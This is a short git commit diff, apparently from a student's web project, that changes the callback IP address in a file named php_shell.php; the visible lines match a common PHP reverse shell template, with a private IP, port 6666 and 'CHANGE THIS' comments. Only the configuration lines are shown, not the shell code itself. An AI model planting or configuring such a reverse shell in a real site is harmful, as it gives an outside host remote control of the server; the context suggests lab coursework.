e03500461d9aa9b67cb63ea2904faaac147a4ee9
agerKalboetxeaga <kalboetxeaga.ager@uni.eus>
2022-11-24 08:19:49 +0100

    ahora si

--- Pag_web/includes/php_shell.php
+++ Pag_web/includes/php_shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.74.50';  // CHANGE THIS
+$ip = '192.168.74.35';  // CHANGE THIS
 $port = 6666;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
